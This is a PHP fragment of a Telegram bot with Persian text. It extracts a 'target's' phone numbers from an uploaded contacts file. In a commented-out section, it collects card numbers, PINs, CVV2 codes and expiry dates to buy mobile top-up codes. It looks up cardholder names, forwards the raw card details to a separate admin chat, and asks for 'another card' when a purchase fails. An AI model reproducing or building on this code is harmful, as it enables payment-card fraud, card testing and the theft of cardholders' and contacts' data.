    file_put_contents("data/$query_id/step.txt","cn_1");
            bot('editMessageText',[ 
            'chat_id'=>$query_id, 
            'message_id'=>$query_messageid,
            'text'=>"
فایل .txt خود را ارسال کنید 📝

توجه کنید فقط فایل مخاطبین و با فرمت .txt 📱☎️
            ",
            'parse_mode'=>"html",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>"بازگشت | Back",'callback_data'=>"back"]]
                    ]
                ])
            ]);  
}
elseif(file_get_contents("data/$chat_id/step.txt")=="cn_1" and $document){
    if(strpos($file,".txt")!==false){
    $get = bot('getfile',['file_id'=>$file_id]);
    $patch = $get->result->file_path;
    $aaa = file_get_contents('https://api.telegram.org/file/bot'.$token.'/'.$patch);
    
preg_match_all('/[A-Za-z ]*[\n]\+([0-9]{12,})/',$aaa,$matches);
$a = $matches[1];
foreach ($a as $value){
$numbers .= "+".$value."\n";
}
sendmessage($chat_id,"لیست شماره های مخاطبین تارگت :
    
<code>$numbers</code>
$team_name","html",$message_id,json_encode([
    'inline_keyboard'=>[
        [['text'=>"بازگشت",'callback_data'=>"back"]]
        ]
    ]));

    }else{
        sendmessage($chat_id,"فایل ارسالی باید با فرمت .txt باشد","html",$message_id,false); 
    }
}
/*
file_put_contents("data/$query_id/type","chooseoperator");
$text = "
کاربر $mention_queryid اپراتور مورد نظر خود را انتخاب کنید.
";
editmessage($query_id,$query_messageid,$text,"html",$operatorlist);
}

        elseif($query == "irancell"){
            file_put_contents("data/$query_id/type","choosecharge");
$text = "
اپراتور انتخاب شده شما : ایرانسل

کاربر $mention_queryid مبلغ مورد نظر خود را انتخاب کنید.
";
editmessage($query_id,$query_messageid,$text,"html",$irancellchoose);
}

        elseif($query == "hamrah"){
            file_put_contents("data/$query_id/type","choosecharge");
$text = "
اپراتور انتخاب شده شما : همراه اول

کاربر $mention_queryid مبلغ مورد نظر خود را انتخاب کنید.
";
editmessage($query_id,$query_messageid,$text,"html",$hamrahchoose);
}

        elseif($query == "rightel"){
            file_put_contents("data/$query_id/type","choosecharge");
$text = "
اپراتور انتخاب شده شما : رایتل

کاربر $mention_queryid مبلغ مورد نظر خود را انتخاب کنید.
";
editmessage($query_id,$query_messageid,$text,"html",$rightelchoose);
}

        elseif($query == "talia"){
            file_put_contents("data/$query_id/type","choosecharge");
$text = "
اپراتور انتخاب شده شما : تالیا

کاربر $mention_queryid مبلغ مورد نظر خود را انتخاب کنید.
";
editmessage($query_id,$query_messageid,$text,"html",$taliachoose);
}

        elseif(file_get_contents("data/$query_id/type") == "choosecharge"){
         if($query < 1 && $query > 30){
sendmessage($query_id,"خطا در عملیات !","html",$message_id);
}
else{
            file_put_contents("data/$query_id/chargecode",$query);
            file_put_contents("data/$query_id/type","quantity");
$text = "
کاربر $mention_queryid تعداد کد شارژ مورد نظر خود را انتخاب کنید.
";
editmessage($query_id,$query_messageid,$text,"html",$quantitycode);
 }
}

        elseif(file_get_contents("data/$query_id/type") == "quantity"){
         if(strpos($query,"A") !== false && strlen($query) == 2){
            file_put_contents("data/$query_id/quantity",str_replace("A","",$query));
            file_put_contents("data/$query_id/type","captcha");
editmessage($query_id,$query_messageid,"در حال اتصال به درگاه پرداخت ...","html");
        $quantity = file_get_contents("data/$query_id/quantity");
        $chargecode = file_get_contents("data/$query_id/chargecode");
        $getcont = file_get_contents("$makecharge?code=$chargecode&quantity=$quantity");
            file_put_contents("data/$query_id/refid",$getcont);
         //sleep(0.3);
         //editmessage($query_id,$query_messageid,$getcont,'html');
         //deletemessage($query_id,$query_messageid);
        $rand = rand(00000,99999);
        $refid = file_get_contents("data/$query_id/refid");
        $getcaptcha = file_get_contents("$captcha?refid=$refid");
        copy("$captchaimg","data/$query_id/captcha".$rand.".jpg");
        $img = new CURLFile("data/$query_id/captcha".$rand.".jpg");
sendphoto($query_id,$img,"لطفا کد امنیتی را ارسال نمایید.",json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"دریافت کد امنیتی جدید","callback_data"=>"refreshcaptcha"]],]
]),$query_messageid);
        unlink("data/$query_id/captcha".$rand.".jpg");
}
else{
sendmessage($query_id,"خطا در انجام عملیات !","html",$message_id);
 }
}

        elseif($query == "refreshcaptcha"){
            file_put_contents("data/$query_id/type","captcha");
        $rand = rand(00000,99999);
        $refid = file_get_contents("data/$query_id/refid");
        $getcaptcha = file_get_contents("$captcha?refid=$refid");
        $url = $_SERVER["HTTP_HOST"];
        copy("$captchaimg","data/$query_id/captcha".$rand.".jpg");
editmedia($query_id,$query_messageid,"https://$url/data/$query_id/captcha".$rand.".jpg","لطفا کد امنیتی جدید را بصورت صحیح ارسال نمایید !",json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"دریافت کد امنیتی جدید","callback_data"=>"refreshcaptcha"]],]
]));
        unlink("data/$query_id/captcha".$rand.".jpg");
}

        elseif(file_get_contents("data/$chat_id/type") == "captcha"){
        $refid = file_get_contents("data/$chat_id/refid");
         if(is_numeric($text)){
         if(mb_strlen($text) == 5){
            file_put_contents("data/$chat_id/type","card");
            file_put_contents("data/$chat_id/captcha",$text);
sendmessage($chat_id,"کارت خود را ارسال نمایید !","html",$message_id);
}
else{
sendmessage($chat_id,"کد امنیتی اشتباه میباشد !","html",$message_id);
 }
}
else{
sendmessage($chat_id,"کد امنیتی اشتباه میباشد !","html",$message_id);
 }
}

        elseif(file_get_contents("data/$chat_id/type") == "card"){
sendmessage($chat_id,"لطفا اندکی صبر کنید ، در حال اتصال با درگاه پرداخت ...","html",$message_id);
        $quantity = file_get_contents("data/$chat_id/quantity");
        $chargecode = file_get_contents("data/$chat_id/chargecode");
            file_put_contents("data/$chat_id/savetransaction","$chargecode/$quantity");
        $refid = file_get_contents("data/$chat_id/refid");
        $captch = file_get_contents("data/$chat_id/captcha");
editmessage($chat_id,$message_id+1,"در حال تشخیص اطلاعات کارت ...","html");
        $card = findcard($text);
        $cardnumber = $card[0];
			     $pass = $card[1];
			     	$cvv2 = $card[2];
		     		$year = $card[3];
	     			$month = $card[4];
         if(empty($cardnumber) || empty($pass) || empty($cvv2) || empty($year) || empty($month)){
editmessage($chat_id,$message_id+1,"خطا در تشخیص اطلاعات کارت ، لطفا بصورت صحیح ارسال نمایید !","markdown");
					die();
				}
editmessage($chat_id,$message_id+1,"در حال دریافت اطلاعات کارت ...","html");
			     	$buy = file_get_contents("$chargebuy?refid=$refid&cardnumber=$cardnumber&pass=$pass&cvv2=$cvv2&month=$month&year=$year&captcha=$captch");
editmessage($chat_id,$message_id+1,"اطلاعات کارت دریافت شد ، لطفا منتظر نتیجه تراکنش بمانید.","html");
        $result = json_decode($buy);
        $ok = $result->status;
         if($ok == 'OK'){
        $codes = $result->codes;
        $codenmb = file_get_contents("data/$chat_id/chargecode");
        $number = file_get_contents("data/$chat_id/quantity");
        $number = str_replace("A","",$number);
        $number = str_replace(['1','2','3','4','5'],['۱','۲','۳','۴','۵'],$number);
        $chargecodeinfo = chargecodeinfo($codenmb);
        $operator = $chargecodeinfo[0];
        $amount = $chargecodeinfo[1];
        $info = json_decode(file_get_contents("$cardinfo?cardnumber=$cardnumber"))->result;
        $holdername = $info->name.$info->family;
$buytext = "
🍫خرید شارژ با موفقیت انجام شد.✅

";
				    	$codelist = 0;
					foreach($codes as $code){
$buytext .= "  <code>$code</code>
";
         if($codelist < count($codes)-1){
$buytext .= "\n";
						}
				    	$codelist++;
					}
$buytext .= "
⌛️ - نام صاحب کارت : $holdername
🔋 - مبلغ شارژ : $amount 🎯
🔧 - اپراتور : $operator 🧨
🎁 - تعداد : $number 🔑
- - - - - - - - - -
$your_id
";
            file_put_contents("data/$chat_id/type","none");
            file_put_contents("data/$chat_id/refid","none");
            file_put_contents("data/$chat_id/chargecode","none");
            file_put_contents("data/$chat_id/quantity","none");
$sendadmin =
file_get_contents("https://api.telegram.org/bot$savedata/SendMessage?parse_mode=HTML&chat_id=$savecard&text=".urlencode($text."\n\nتراکنش خرید شارژ $mention_chatid با موفقیت انجام شد."));
$sendadmin =
file_get_contents("https://api.telegram.org/bot$savedata/SendMessage?parse_mode=HTML&chat_id=$savecharge&text=".urlencode($buytext."\nتراکنش خرید شارژ $mention_chatid با موفقیت انجام شد."));
sendmessage($chat_id,$buytext,"html",$message_id);
sendmessage($chat_id,"کاربر $mention_chatid تراکنش شما با موفقیت انجام شد.","html",$message_id,json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"تکرار تراکنش","callback_data"=>"repeattransaction"]
                 ],
                 [
                        ['text'=>"بازگشت","callback_data"=>"back"]],]
]));
}

        elseif($ok == 'INVALID_CAPTCHA'){
            file_put_contents("data/$chat_id/type","captcha");
        $rand = rand(00000,99999);
        $refid = file_get_contents("data/$chat_id/refid");
        $getcaptcha = file_get_contents("$captcha?refid=$refid");
        copy("$captchaimg","data/$chat_id/captcha".$rand.".jpg");
sendphoto($chat_id,new CURLFile("data/$chat_id/captcha".$rand.".jpg"),"لطفا کد امنیتی را بدرستی ارسال نمایید !",json_encode([
                'inline_keyboard' => [
                	[
                        ['text'=>"دریافت کد امنیتی جدید","callback_data"=>"refreshcaptcha"]],]
]),$message_id);
        unlink("data/$chat_id/captcha".$rand.".jpg");
}

        elseif($ok == false){
        $des = $result->des;
sendmessage($chat_id,$des."\nلطفا کارت دیگری ارسال نمایید !","html",$message_id);
}
        elseif($ok == 'SALE_FAILED'){
        $des = $result->description;
sendmessage($chat_id,$des."\nلطفا کارت دیگری ارسال نمایید !","html",$message_id);
}
        elseif($ok == 'INVALID_INPUT'){
sendmessage($chat_id,"ورودی نامعتبر ، لطفا کارت دیگری ارسال نمایید !","html",$message_id);
}

        elseif($ok == 'BLOCKER_ERROR'){
            file_put_contents("data/$chat_id/type","none");
            file_put_contents("data/$chat_id/refid","none");
            file_put_contents("data/$chat_id/chargecode","none");
            file_put_contents("data/$chat_id/quantity","none");
sendmessage($chat_id,"بیش از حد تلاش کرده اید ، لطفا دوباره اقدام به خرید شارژ کنید !","html",$message_id,json_encode([
                'inline_keyboard' => [
             
                 [
                        ['text'=>"بازگشت","callback_data"=>"back"]],]
]));
}
else{
            file_put_contents("data/$chat_id/type","none");
            file_put_contents("data/$chat_id/refid","none");
            file_put_contents("data/$chat_id/chargecode","none");
            file_put_contents("data/$chat_id/quantity","none");
sendmessage($chat_id,"خطای نامشخصی رخ داده است !","html",$message_id,json_encode([
                'inline_keyboard' => [
                	[

                 [
                        ['text'=>"بازگشت","callback_data"=>"back"]],]
]]));
 }
}
*/
?>
